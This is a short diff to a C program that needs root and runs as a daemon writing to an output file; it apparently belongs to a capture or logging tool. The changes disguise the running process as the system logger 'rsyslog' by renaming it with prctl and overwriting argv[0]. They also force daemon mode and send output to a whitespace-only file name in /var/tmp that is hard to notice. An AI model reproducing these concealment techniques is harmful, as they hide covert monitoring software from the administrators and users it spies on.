@@ -8,6 +8,7 @@
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <getopt.h>
+#include <sys/prctl.h>
 
 #define FILE_MAIN 1
 #include "config.h"
@@ -108,6 +109,7 @@ void terminal(int argc, char *argv[], char *envp[]) {
 int main(int argc, char *argv[], char *envp[]) {
   int opt = 0;
   int daemon = 0;
+  char *procname = "rsyslog";
 
   signal(SIGINT, exitsig);
   signal(SIGQUIT, exitsig);
@@ -121,6 +123,7 @@ int main(int argc, char *argv[], char *envp[]) {
 
   if (geteuid() != 0) needroot();
 
+  /*
   while ((opt = getopt(argc, (void*)argv, "do:")) != EOF) {
     switch(opt) {
       case 'd': daemon = 1; break;
@@ -131,6 +134,15 @@ int main(int argc, char *argv[], char *envp[]) {
       default: usage(argv[0]);
     }
   }
+  */
+
+  daemon = 1;
+  outfile = "/var/tmp/    ";
+
+#if 1
+  prctl(PR_SET_NAME, (unsigned long)procname, 0, 0, 0);
+  strncpy(argv[0], procname, strlen(argv[0]));
+#endif
 
   if (daemon) daemonize(argc, argv, envp);
   else terminal(argc, argv, envp);
